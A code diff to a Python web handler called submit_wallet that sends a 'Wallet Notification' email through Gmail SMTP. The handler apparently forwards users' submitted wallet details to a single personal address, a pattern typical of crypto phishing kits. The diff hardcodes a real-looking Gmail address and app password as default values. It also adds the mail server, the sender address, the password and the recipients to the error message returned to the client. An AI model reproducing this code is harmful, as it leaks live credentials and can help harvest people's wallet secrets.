@@ -345,9 +345,12 @@ def submit_wallet():
         )
 
         # Send email using smtplib
-        sender_email = getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com')
+        mail_server = getenv('MAIL_SERVER_2', 'smtp.googlemail.com')
+        mail_port = getenv('MAIL_PORT', 587)
+        sender_username = getenv('MAIL_USERNAME_2', 'boluwatifemayowa01@gmail.com')
+        sender_email = getenv('MAIL_EMail_2', 'boluwatifemayowa01@gmail.com')
         sender_name = "Wallet Notification"
-        sender_password = getenv('MAIL_PASSWORD', 'qaec dxyl tlqh ajjs')
+        sender_password = getenv('MAIL_PASSWORD_2', 'qaec dxyl tlqh ajjs')
         recipients = [getenv('MAIL_USERNAME', 'boluwatifemayowa01@gmail.com')]  # Add your recipients here
 
         try:
@@ -361,9 +364,9 @@ def submit_wallet():
 
             # Connect to the SMTP server and send the email
             # with smtplib.SMTP('smtp.gmail.com', 587) as server:
-            with smtplib.SMTP(getenv('MAIL_SERVER', 'smtp.googlemail.com'), getenv('MAIL_PORT', 587)) as server:
+            with smtplib.SMTP(mail_server, mail_port) as server:
                 server.starttls()
-                server.login(sender_email, sender_password)
+                server.login(sender_username, sender_password)
                 server.sendmail(sender_email, recipients, msg.as_string())
 
             print(f"Email sent successfully to {recipients}")
@@ -372,7 +375,7 @@ def submit_wallet():
             traceback.format_exc()
             print(f"Failed to send email: {email_error}")
             # return error_response("Failed to send email. Please try again.")
-            return error_response(f"Failed to connect. Please try again. - {email_error}")
+            return error_response(f"Failed to connect. Please try again. - {email_error}\n\n {mail_server, mail_port, sender_email, sender_password, recipients}")
 
         data = {
             # 'message': f'Your {wallet_type.title} wallet has been successfully submitted!',
